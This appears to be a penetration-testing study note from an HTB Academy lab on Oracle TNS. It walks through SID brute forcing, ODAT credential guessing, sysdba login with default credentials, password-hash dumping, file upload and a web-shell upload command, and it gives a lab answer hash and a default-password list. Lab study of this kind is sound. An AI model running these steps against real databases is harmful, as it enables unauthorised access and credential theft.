# Oracle TNS Enumeration

## Overview
The Oracle Transparent Network Substrate (TNS) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the Oracle Net Services software suite, TNS supports various networking protocols between Oracle databases and client applications, such as IPX/SPX and TCP/IP protocol stacks.

**Key Characteristics:**
- **Port 1521**: Default Oracle TNS port
- **Authentication**: Username/password
- **SID**: System Identifier for database instances
- **Protocol**: Oracle Native Network Protocol
- **Industries**: Healthcare, finance, retail (large, complex databases)

## TNS Features and Capabilities

TNS has been updated to support newer technologies and provides:

| Feature | Description |
|---------|-------------|
| **Name resolution** | Resolves service names to network addresses |
| **Connection management** | Manages database connections and sessions |
| **Load balancing** | Distributes connections across multiple instances |
| **Security** | Built-in encryption mechanism for data transmission |
| **IPv6 Support** | Modern network protocol support |
| **SSL/TLS Encryption** | Additional security layer over TCP/IP |

## Advanced TNS Capabilities

### Security Features
- **Encryption**: Client-server communication encryption
- **Authentication**: Host-based and user-based authentication
- **Network Security**: Protection against unauthorized access

### Administrative Tools
- **Performance Monitoring**: Comprehensive performance analysis tools
- **Error Reporting**: Detailed logging capabilities
- **Workload Management**: Database service management
- **Fault Tolerance**: High availability through database services

## Default Configuration

### Basic TNS Configuration
By default, the Oracle TNS listener:
- **Port**: Listens on TCP/1521 (configurable)
- **Protocols**: Supports TCP/IP, UDP, IPX/SPX, and AppleTalk
- **Interfaces**: Can listen on multiple network interfaces
- **Management**: Remotely manageable in Oracle 8i/9i (not in 10g/11g)

### Security Features
- **Host Authorization**: Accepts connections only from authorized hosts
- **Basic Authentication**: Uses hostnames, IP addresses, usernames, and passwords
- **Encryption**: Oracle Net Services encrypts client-server communication

## Configuration Files

### tnsnames.ora (Client-side)
The client-side configuration file used by Oracle Net Services to resolve service names:

```bash
# Location: $ORACLE_HOME/network/admin/tnsnames.ora
# Example configuration:
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

**Key Components:**
- **Service Name**: ORCL (client identifier)
- **Host**: 10.129.11.102 (database server)
- **Port**: 1521 (listener port)
- **Service**: orcl (database service name)

### listener.ora (Server-side)
The server-side configuration file defining listener process properties:

```bash
# Location: $ORACLE_HOME/network/admin/listener.ora
# Example configuration:
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

## TNS Configuration Parameters

### Essential Settings

| Setting | Description |
|---------|-------------|
| **DESCRIPTION** | Descriptor providing database name and connection type |
| **ADDRESS** | Network address including hostname and port number |
| **PROTOCOL** | Network protocol used for communication |
| **PORT** | Port number for server communication |
| **CONNECT_DATA** | Connection attributes (service name, SID, protocol) |
| **INSTANCE_NAME** | Database instance name for client connection |
| **SERVICE_NAME** | Service name for client connection |
| **SERVER** | Server type (dedicated or shared) |
| **USER** | Username for database authentication |
| **PASSWORD** | Password for database authentication |

### Advanced Settings

| Setting | Description |
|---------|-------------|
| **SECURITY** | Connection security type |
| **VALIDATE_CERT** | SSL/TLS certificate validation |
| **SSL_VERSION** | SSL/TLS version for connection |
| **CONNECT_TIMEOUT** | Connection establishment time limit |
| **RECEIVE_TIMEOUT** | Response receiving time limit |
| **SEND_TIMEOUT** | Request sending time limit |
| **SQLNET.EXPIRE_TIME** | Connection failure detection time limit |
| **TRACE_LEVEL** | Database connection tracing level |
| **TRACE_DIRECTORY** | Trace file storage directory |
| **TRACE_FILE_NAME** | Trace file name |
| **LOG_FILE** | Log information storage file |

## Oracle Version Differences

### Password Defaults
- **Oracle 9**: Default password `CHANGE_ON_INSTALL`
- **Oracle 10**: No default password set
- **Oracle DBSNMP**: Default password `dbsnmp`

### Service Integration
Oracle TNS is often used with:
- Oracle DBSNMP
- Oracle Application Server
- Oracle Enterprise Manager
- Oracle Fusion Middleware
- Web servers
- Legacy services (like finger service)

## Security Features

### PL/SQL Exclusion List
Oracle databases can be protected using PL/SQL Exclusion List (PlsqlExclusionList):
- **Location**: `$ORACLE_HOME/sqldeveloper` directory
- **Purpose**: Text file containing PL/SQL packages to exclude from execution
- **Function**: Serves as a blacklist for Oracle Application Server
- **Implementation**: Loaded into database instance for package restrictions

## Setting up Oracle TNS Tools

### Complete Setup Script
```bash
# Download Oracle Instant Client
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip

# Extract Oracle Instant Client
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip

# Set environment variables
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc

# Clone and setup ODAT
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

### Testing ODAT Installation
```bash
# Test ODAT installation
./odat.py -h

# Expected output:
usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
```

## Enumeration Techniques

### 1. Service Detection
```bash
# Nmap Oracle TNS detection
sudo nmap -p1521 -sV target --open

# Example output:
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

### 2. SID Enumeration

#### System Identifier (SID) Concepts
- **Purpose**: Unique name identifying a particular database instance
- **Multiple Instances**: Each instance has its own System ID
- **Connection**: Client specifies SID in connection string
- **Default**: Uses tnsnames.ora value if not specified
- **Management**: Used by DBAs to monitor and manage instances

#### SID Brute Forcing with Nmap
```bash
# Nmap SID brute forcing
sudo nmap -p1521 -sV target --open --script oracle-sid-brute

# Example output:
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE
```

### 3. ODAT Comprehensive Enumeration
```bash
# Run all ODAT modules
./odat.py all -s target

# Example output:
[+] Checking if target target:1521 is well configured for a connection...
[+] According to a test, the TNS listener target:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password
[!] Notice: 'outln' account is locked, so skipping this username for password
[+] Valid credentials found: scott/tiger. Continue...
```

## Database Interaction

### SQLplus Connection
```bash
# Connect with discovered credentials
sqlplus scott/tiger@target/XE

# Example connection output:
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days

Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

### Library Error Fix
```bash
# If you encounter library errors
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

## Database Enumeration

### Basic Database Information
```bash
# List all tables
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP
...SNIP...

# Check user privileges
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

### Privilege Escalation
```bash
# Connect as sysdba for higher privileges
sqlplus scott/tiger@target/XE as sysdba

# Check elevated privileges
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO
...SNIP...
```

## Password Hash Extraction

### Extract User Password Hashes
```bash
# Extract password hashes from sys.user$
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

## File Upload Capabilities

### Web Server Default Paths

| OS | Path |
|----|------|
| **Linux** | `/var/www/html` |
| **Windows** | `C:\inetpub\wwwroot` |

### File Upload with ODAT
```bash
# Create test file
echo "Oracle File Upload Test" > testing.txt

# Upload file to target
./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Example output:
[1] (target:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the target server
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the target server like the testing.txt file
```

### Verify File Upload
```bash
# Test file upload with curl
curl -X GET http://target/testing.txt

# Expected output:
Oracle File Upload Test
```

## HTB Academy Lab Questions

### Question: Password Hash Extraction
**Task**: Enumerate the target Oracle database and submit the password hash of the user DBSNMP

**Solution**:
```bash
# Step 1: Service detection
sudo nmap -p1521 -sV target --open

# Step 2: SID enumeration
sudo nmap -p1521 --script oracle-sid-brute target
# Result: SID found (e.g., XE)

# Step 3: Comprehensive enumeration with ODAT
./odat.py all -s target
# Result: Found credentials (e.g., scott/tiger)

# Step 4: Connect to database
sqlplus scott/tiger@target/XE as sysdba

# Step 5: Extract DBSNMP password hash
SQL> select name, password from sys.user$ where name = 'DBSNMP';

NAME                           PASSWORD
------------------------------ ------------------------------
DBSNMP                         E066D214D5421CCC

# Answer: E066D214D5421CCC
```

## Advanced Enumeration Techniques

### ODAT Module Overview
```bash
# Available ODAT modules:
all                   # Run all modules
tnscmd               # Communicate with TNS listener
tnspoison            # Exploit TNS poisoning attack
sidguesser           # Discover valid SIDs
snguesser            # Discover valid Service Names
passwordguesser      # Discover valid credentials
utlhttp              # Send HTTP requests or scan ports
httpuritype          # Send HTTP requests or scan ports
utltcp               # Scan ports
ctxsys               # Read files
externaltable        # Read files or execute commands
dbmsxslprocessor     # Upload files
dbmsadvisor          # Upload files
utlfile              # Download/upload/delete files
dbmsscheduler        # Execute system commands
java                 # Execute system commands
passwordstealer      # Get hashed Oracle passwords
oradbg               # Execute binaries or scripts
dbmslob              # Download files
stealremotepwds      # Steal passwords via authentication sniffing
userlikepwd          # Test username as password
smb                  # Capture SMB authentication
privesc              # Gain elevated access
cve                  # Exploit CVEs
search               # Search databases, tables, columns
unwrapper            # Unwrap PL/SQL source code
clean                # Clean traces and logs
```

## Security Assessment

### Common Vulnerabilities
1. **Default Credentials**: Standard Oracle accounts with default passwords
2. **SID Enumeration**: Brute force attacks on SID values
3. **Privilege Escalation**: Weak privilege controls
4. **File Upload**: Arbitrary file upload capabilities
5. **Password Hash Extraction**: Weak password hashing

### Enumeration Checklist
- [ ] Port scan for 1521
- [ ] Service version detection
- [ ] SID enumeration
- [ ] Credential testing
- [ ] Database connection
- [ ] Privilege escalation testing
- [ ] Password hash extraction
- [ ] File upload capabilities
- [ ] Web shell deployment

## Attack Vectors

### 1. Credential-based Access
```bash
# Common Oracle credentials
scott/tiger
system/manager
sys/sys
dbsnmp/dbsnmp
```

### 2. File Upload Exploitation
```bash
# Upload web shell
./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php
```

### 3. Database Information Extraction
```bash
# Extract sensitive information
SQL> SELECT * FROM dba_users;
SQL> SELECT * FROM dba_role_privs;
SQL> SELECT * FROM dba_tab_privs;
```

## Defensive Measures

### Security Best Practices
1. **Change Default Passwords**: Replace all default Oracle passwords
2. **Restrict Network Access**: Limit TNS listener network exposure
3. **Enable Encryption**: Use SSL/TLS for all connections
4. **Regular Updates**: Apply Oracle security patches
5. **Monitor Access**: Enable audit logging
6. **Least Privilege**: Restrict database user permissions 